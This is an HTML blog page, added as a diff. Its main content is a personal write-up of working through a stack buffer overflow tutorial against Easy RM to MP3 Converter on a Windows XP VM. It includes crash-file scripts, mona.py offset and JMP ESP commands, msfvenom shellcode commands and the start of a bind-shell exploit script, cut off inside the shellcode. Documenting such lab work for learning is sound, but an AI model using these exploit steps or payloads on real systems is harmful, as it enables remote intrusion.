@@ -1,0 +1,1090 @@
+<!DOCTYPE html>
+<!--[if IE 6]>
+<html id="ie6" lang="en-US">
+<![endif]--><!--[if IE 7]>
+<html id="ie7" lang="en-US">
+<![endif]--><!--[if IE 8]>
+<html id="ie8" lang="en-US">
+<![endif]--><!--[if !(IE 6) & !(IE 7) & !(IE 8)]><!--><html lang="en-US">
+<!--<![endif]-->
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<title>
+Graeme Robinson&#039;s blog | A place for my thoughts when I was starting to break into the information security feild	</title>
+<link rel="profile" href="https://gmpg.org/xfn/11">
+<link rel="stylesheet" type="text/css" media="all" href="/wp-content/themes/twentyelevenmod/style.css?ver=20240716">
+<link rel="pingback" href="/xmlrpc.php">
+<!--[if lt IE 9]>
+<script src="/wp-content/themes/twentyeleven/js/html5.js?ver=3.7.0" type="text/javascript"></script>
+<![endif]-->
+<meta name="robots" content="max-image-preview:large">
+<link rel="alternate" type="application/rss+xml" title="Graeme Robinson&#039;s blog &raquo; Feed" href="/feed/">
+<link rel="alternate" type="application/rss+xml" title="Graeme Robinson&#039;s blog &raquo; Comments Feed" href="/comments/feed/">
+<script type="text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/www.grobinson.me\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"🏳️‍⚧️","🏳️​⚧️")?!1:!n(e,"🇺🇳","🇺​🇳")&&!n(e,"🏴󠁧󠁢󠁥󠁮󠁧󠁿","🏴​󠁧​󠁢​󠁥​󠁮​󠁧​󠁿");case"emoji":return!n(e,"🐦‍⬛","🐦​⬛")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+<style id="wp-emoji-styles-inline-css" type="text/css">img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}</style>
+<link rel="stylesheet" id="wp-block-library-css" href="/wp-includes/css/dist/block-library/style.min.css?ver=6.6.2" type="text/css" media="all">
+<style id="wp-block-library-theme-inline-css" type="text/css">.wp-block-audio :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-audio :where(figcaption){color:#ffffffa6}.wp-block-audio{margin:0 0 1em}.wp-block-code{border:1px solid #ccc;border-radius:4px;font-family:Menlo,Consolas,monaco,monospace;padding:.8em 1em}.wp-block-embed :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-embed :where(figcaption){color:#ffffffa6}.wp-block-embed{margin:0 0 1em}.blocks-gallery-caption{color:#555;font-size:13px;text-align:center}.is-dark-theme .blocks-gallery-caption{color:#ffffffa6}:root :where(.wp-block-image figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme :root :where(.wp-block-image figcaption){color:#ffffffa6}.wp-block-image{margin:0 0 1em}.wp-block-pullquote{border-bottom:4px solid;border-top:4px solid;color:currentColor;margin-bottom:1.75em}.wp-block-pullquote cite,.wp-block-pullquote footer,.wp-block-pullquote__citation{color:currentColor;font-size:.8125em;font-style:normal;text-transform:uppercase}.wp-block-quote{border-left:.25em solid;margin:0 0 1.75em;padding-left:1em}.wp-block-quote cite,.wp-block-quote footer{color:currentColor;font-size:.8125em;font-style:normal;position:relative}.wp-block-quote.has-text-align-right{border-left:none;border-right:.25em solid;padding-left:0;padding-right:1em}.wp-block-quote.has-text-align-center{border:none;padding-left:0}.wp-block-quote.is-large,.wp-block-quote.is-style-large,.wp-block-quote.is-style-plain{border:none}.wp-block-search .wp-block-search__label{font-weight:700}.wp-block-search__button{border:1px solid #ccc;padding:.375em .625em}:where(.wp-block-group.has-background){padding:1.25em 2.375em}.wp-block-separator.has-css-opacity{opacity:.4}.wp-block-separator{border:none;border-bottom:2px solid;margin-left:auto;margin-right:auto}.wp-block-separator.has-alpha-channel-opacity{opacity:1}.wp-block-separator:not(.is-style-wide):not(.is-style-dots){width:100px}.wp-block-separator.has-background:not(.is-style-dots){border-bottom:none;height:1px}.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){height:2px}.wp-block-table{margin:0 0 1em}.wp-block-table td,.wp-block-table th{word-break:normal}.wp-block-table :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-table :where(figcaption){color:#ffffffa6}.wp-block-video :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-video :where(figcaption){color:#ffffffa6}.wp-block-video{margin:0 0 1em}:root :where(.wp-block-template-part.has-background){margin-bottom:0;margin-top:0;padding:1.25em 2.375em}</style>
+<style id="classic-theme-styles-inline-css" type="text/css">/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}</style>
+<style id="global-styles-inline-css" type="text/css">:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #fff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--blue: #1982d1;--wp--preset--color--dark-gray: #373737;--wp--preset--color--medium-gray: #666;--wp--preset--color--light-gray: #e2e2e2;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}</style>
+<link rel="stylesheet" id="wp-syntax-css-css" href="/wp-content/plugins/wp-syntax/css/wp-syntax.css?ver=1.2" type="text/css" media="all">
+<link rel="stylesheet" id="twentyeleven-block-style-css" href="/wp-content/themes/twentyeleven/blocks.css?ver=20240621" type="text/css" media="all">
+<script type="text/javascript" src="/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script type="text/javascript" src="/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<link rel="https://api.w.org/" href="/wp-json/">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="/xmlrpc.php?rsd">
+<meta name="generator" content="WordPress 6.6.2">
+	<style>/* Link color */
+		a,
+		#site-title a:focus,
+		#site-title a:hover,
+		#site-title a:active,
+		.entry-title a:hover,
+		.entry-title a:focus,
+		.entry-title a:active,
+		.widget_twentyeleven_ephemera .comments-link a:hover,
+		section.recent-posts .other-recent-posts a[rel="bookmark"]:hover,
+		section.recent-posts .other-recent-posts .comments-link a:hover,
+		.format-image footer.entry-meta a:hover,
+		#site-generator a:hover {
+			color: #ff7600;
+		}
+		section.recent-posts .other-recent-posts .comments-link a:hover {
+			border-color: #ff7600;
+		}
+		article.feature-image.small .entry-summary p a:hover,
+		.entry-header .comments-link a:hover,
+		.entry-header .comments-link a:focus,
+		.entry-header .comments-link a:active,
+		.feature-slider a.active {
+			background-color: #ff7600;
+		}</style>
+	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+<style type="text/css" id="custom-background-css">body.custom-background { background-color: #f1f1f1; }</style>
+	</head>
+
+<body class="home blog custom-background wp-embed-responsive single-author two-column right-sidebar">
+<div class="skip-link"><a class="assistive-text" href="#content">Skip to primary content</a></div>
+<div class="skip-link"><a class="assistive-text" href="#secondary">Skip to secondary content</a></div>
+<div id="page" class="hfeed">
+	<header id="branding">
+			<hgroup>
+				<h1 id="site-title"><span><a href="/" rel="home">Graeme Robinson&#039;s blog</a></span></h1>
+				<h2 id="site-description">A place for my thoughts when I was starting to break into the information security feild</h2>
+			</hgroup>
+
+						<a href="/">
+				<img src="/wp-content/uploads/2012/09/copy-Bruv-Beans-Banner.jpg" width="1000" height="228" alt="Graeme Robinson&#039;s blog" srcset="/wp-content/uploads/2012/09/copy-Bruv-Beans-Banner.jpg 1000w, /wp-content/uploads/2012/09/copy-Bruv-Beans-Banner-300x68.jpg 300w, /wp-content/uploads/2012/09/copy-Bruv-Beans-Banner-500x114.jpg 500w" sizes="(max-width: 1000px) 100vw, 1000px" decoding="async" fetchpriority="high">			</a>
+			
+									<form method="get" id="searchform" action="/">
+		<label for="s" class="assistive-text">Search</label>
+		<input type="text" class="field" name="s" id="s" placeholder="Search">
+		<input type="submit" class="submit" name="submit" id="searchsubmit" value="Search">
+	</form>
+			
+			<nav id="access">
+				<h3 class="assistive-text">Main menu</h3>
+				<div class="menu"><ul>
+<li class="current_page_item"><a href="/">Home</a></li>
+<li class="page_item page-item-2"><a href="/about-me/">About Me</a></li>
+<li class="page_item page-item-13"><a href="/infosec-links/">InfoSec Links</a></li>
+</ul></div>
+			</nav><!-- #access -->
+	</header><!-- #branding -->
+
+
+	<div id="main">
+
+		<div id="primary">
+			<div id="content" role="main">
+
+			
+							<nav id="nav-above">
+				<h3 class="assistive-text">Post navigation</h3>
+				<div class="nav-previous"><a href="/page/2/"><span class="meta-nav">&larr;</span> Older posts</a></div>
+				<div class="nav-next"></div>
+			</nav><!-- #nav-above -->
+			
+				
+					
+	<article id="post-342" class="post-342 post type-post status-publish format-standard hentry category-buffer-overflow category-immunity category-mona-py category-uncategorized">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/learning-more-about-buffer-overflow-exploits/" rel="bookmark">Learning more about buffer overflow exploits</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/learning-more-about-buffer-overflow-exploits/" title="9:48 PM" rel="bookmark"><time class="entry-date" datetime="2018-07-20T21:48:34+00:00">2018-07-20</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/learning-more-about-buffer-overflow-exploits/#comments">1</a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<h1>Preamble</h1>
+<p>After passing OSCP, I took a bit of a break from studying, but I&#8217;ve decided to get back on it and start learning more about exploit development, since that was part of the OSCP course that I found very interesting.</p>
+<p>I had heard about the <a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">series of tutorials on the corelan blog</a> so I started to work through the first one and in doing so I hit a few problems and learned a few interesting things that I thought might be useful to others.</p>
+<p>After mentioning to a colleague that I was learning about exploit development, they mentioned that <a href="https://www.fuzzysecurity.com/tutorials/expDev/1.html">fuzzysecurity has some good exploit development tutorials</a> too, so I will check those out in parallel.</p>
+<p>Anyway, let&#8217;s get on with my experiences while following corelan&#8217;s &#8220;<a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">Exploit writing tutorial part 1</a>&#8220;:</p>
+<h1>Setting up the environment</h1>
+<p>The first thing I had to do was get a Windows XP VM up and running, install the vulnerable version of &#8220;Easy RM to MP3 Converter&#8221; and create an m3u file that would cause the application to crash. I&#8217;ll explain how I got a copy of Windows XP running in a VM for free (I could probably get this through my MSDN subscription, but that&#8217;s not necessary) and how I downloaded the app and created the m3u exploit file (hint: I didn&#8217;t use the perl script in corelan&#8217;s article).</p>
+<h2>Windows XP VM</h2>
+<p>Microsoft offers <a href="https://www.microsoft.com/en-gb/download/details.aspx?id=8002">a Windows XP VM as a free download</a>. It is intended to be run in Windows 7, providing a way of running programs that run on XP, but won&#8217;t on Windows 7, for example 16 bit executables. This &#8220;feature&#8221; is called &#8220;XP Mode&#8221;.</p>
+<p>The download is an executable. If we inspect the exe file (using something like 7zip, don&#8217;t execute it!), we can extract the file &#8220;sources/xpm&#8221;, then rename it to xpm.cab and extract the &#8220;VirtualXPVHD&#8221; file from it. Rename this file to &#8220;VirtualXP.VHD&#8221; and then create a new VM in virtual box and use this file as the hard disk. It may be worth taking a snapshot before you start the VM because it will not be licensed and will stop working after 30 days. If you take a snapshot, you can revert it and get 30 days use out of it again.</p>
+<h2>Easy RM to MP3 Converter</h2>
+<p>I downloaded this from <a href="https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe">here on exploit-db</a>. The link comes from <a href="https://www.exploit-db.com/exploits/9186/">this exploit page</a>.</p>
+<h2>Creating m3u that causes crash</h2>
+<p>I use both python and perl at work, but I have more experience in python and I prefer it, so I installed python (I installed version 2.7.15 because it&#8217;s the latest v2.x and it supports Windows XP, where the latest v3.x doesn&#8217;t support Windows XP) and ported the code from perl to python. This is what I used to create the first m3u file from the article:</p>
+<pre style="padding-left: 30px;">#!/usr/bin/env python
+
+
+with open("crash.m3u", "w") as file:
+    file.write("A" * 10000)
+
+
+print "m3u File Created successfully"</pre>
+<p>It doesn&#8217;t cause the crash, but if the number of &#8220;A&#8221;s is changed to 30000 then it will.</p>
+<h1>Debugging</h1>
+<p>I decided to use Immunity debugger because I think it has a nicer interface and can do more than Windbg. I also added mona.py (also from corelan) and used some of it&#8217;s features to make the process easier. The manual for mona.py which includes instructions to download and install it <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/">can be found here</a>.</p>
+<h1>Finding the offset to overwrite EIP</h1>
+<p>This section details finding the exact place in the m3u file that we need to put the bytes that we want to end up in EIP. It starts off by splitting the 30000 bytes into two chunks; the first one is 25000 and the second one is 5000. Then after determining that the bytes from the second (smaller) chunk are placed in EIP, a more accurate method is used to find the exact bytes.<strong> I tried to skip this step, which gave me incorrect results and it took me quite some time to figure out why. </strong>I&#8217;ll explain what tripped me up:</p>
+<p>The article explains how to use a tool from the Metasploit framework to generate a pattern where the exact offset of a string of bytes can be identified. Incidentally, this syntax for this tool has changed, and it has moved in Kali (the successor to Backtrack, which it looks like is being used in this article). In Kali, it can be found at /usr/share/metasploit-framework/tools/exploit/pattern_create.rb but there is a symlink to it at /usr/bin/msf-pattern_create, so it can be run by just typing &#8220;msf-pattern_create&#8221;. I decided that since I have mona.py installed, I would just use that tool since it meant I didn&#8217;t need to start my Kali VM. I used mona.py to create a 30000 byte pattern using the command &#8220;!mona pc 30000&#8221; in Immunity debugger. A pattern is output to the log, but it&#8217;s truncated, so it can be copied from &#8220;C:\Program Files\Immunity Inc\Immunity Debugger\pattern.txt&#8221;.</p>
+<p>I stuck this pattern in my python file and created a new m3u like this:</p>
+<pre>#!/usr/bin/env python
+
+
+PATTERN = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1...Ml1Ml2Ml3Ml4Ml5Ml6Ml7Ml8Ml9"
+
+
+with open("crash.m3u", "w") as file:
+file.write(PATTERN) 
+
+
+print "m3u File Created successfully"</pre>
+<p>and when I opened that file with Immunity attached, I saw the bytes &#8220;48386B48&#8221; in EIP. I used mona.py to locate those bytes (using the command &#8220;!mona po 48386B48&#8221;) in the pattern and it said they were at offset 5784. When I changed the bytes at that position in the m3u file, it didn&#8217;t make a difference to EIP shown in Immunity when I reloaded the file. I eventually discovered that the pattern created by Metasploit and mona is only 20,280 (26*26*10*3) bytes long and after that it starts again. The byte pattern in EIP was indeed the same as at offset 5784, but it was also at offset 26064 (5784 + 20280) and those are the bytes that made it into EIP! I should have just followed the steps, but I did end up learning the limitations of that pattern generator and offset locator.</p>
+<h1>\xCC AKA INT3 aka &#8220;break&#8221;</h1>
+<p>The article skips over what this mysterious \xCC byte does. A quick google search led me to <a href="https://en.wikipedia.org/wiki/INT_(x86_instruction)#INT_3">an article on wikipedia</a> that explained that it&#8217;s special single byte interrupt instruction for use by debuggers, so when the program hits this instruction, Immunity will pause execution so we can inspect the state of the registers and memory. Very useful!</p>
+<h1>Finding a JMP ESP instruction</h1>
+<p>The article covers how to find a JMP ESP instruction using Windbg, but not Immunity. I turned to mona.py again and used the command:</p>
+<pre>!mona f -type instr -s "jmp esp" -o -cp nonull</pre>
+<p>&#8230;which showed me some location in the log, but also wrote them to &#8220;C:\Program Files\Immunity Inc\Immunity Debugger\find.txt&#8221;</p>
+<h2>Creating my own Shellcode using Metasploit</h2>
+<p>I tried creating my own shellcode to spawn calc using &#8220;msfvenom -p windows/exec -f python&#8221;, but it didn&#8217;t work. Looking in the debugger, I could see that my Shellcode was being truncated. This was because my shellcode contained at least one null byte (\x00), but that wasn&#8217;t the only byte that caused the shellcode to become truncated, as I found out when I removed the null bytes. The article didn&#8217;t make it clear, but I would have to specify which bytes to exclude from the shellcode. Of course, I could use the the alpha_upper encoder which is shown later in the article, but I wanted to have a small shellcode. To find the bad bytes, I wanted to create a sequence of bytes 00 to FF and put them in the m3u file. I created the sequence of bytes again using mona.py. The command was &#8220;!mona ba&#8221; and mona would output to the log, but also to &#8220;C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.txt&#8221; and I could stick that in my python script so that it would be written in the m3u file. Every time I saw a byte cause truncation or get swapped with another byte, I would add that to the list of bad chars for msfvenom to avoid. I ended up actually only finding two bad bytes; \x00 \x0A. To generate my own shellcode that spawned calc, I ran this command:</p>
+<pre>msfvenom -p windows/exec -f python -b "\x00\x0a" CMD=calc</pre>
+<h1>Completed python script to create bind shell exploit</h1>
+<pre>#!/usr/bin/env python
+
+# msfvenom -p windows/shell_bind_tcp -e x86/alpha_upper -f python EXITFUNC=seh
+buf = ""
+buf += "\x89\xe3\xda\xdc\xd9\x73\xf4\x5e\x56\x59\x49\x49\x49"
+buf += "\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33"
+buf += "\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41"
+buf += "\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41"
+buf += "\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a"
+buf += "\x4a\x49\x4b\x4c\x4d\x38\x4b\x32\x55\x50\x35\x50\x35"
+buf += "\x50\x55\x30\x4b\x39\x4b\x55\x36\x51\x39\x50\x52\x44"
+buf += "\x4c\x4b\x36\x30\x46\x50\x4c\x4b\x46\x32\x44\x4c\x4c"
+buf += "\x4b\x50\x52\x32\x34\x4c\x4b\x33\x42\x57\x58\x34\x4f"
+buf += "\x4e\x57\x50\x4a\x56\x46\x50\x31\x4b\x4f\x4e\x4c\x57"
+buf += "\x4c\x35\x31\x33\x4c\x35\x52\x56\x4c\x47\x50\x4f\x31"
+buf += "\x58\x4f\x54\x4d\x55\x51\x58\x47\x5a\x42\x4c\x32\x31"
+buf += "\x42\x51\x47\x4c\x4b\x36\x32\x52\x30\x4c\x4b\x31\x5a"
+buf += "\x57\x4c\x4c\x4b\x50\x4c\x52\x31\x53\x48\x4a\x43\x37"
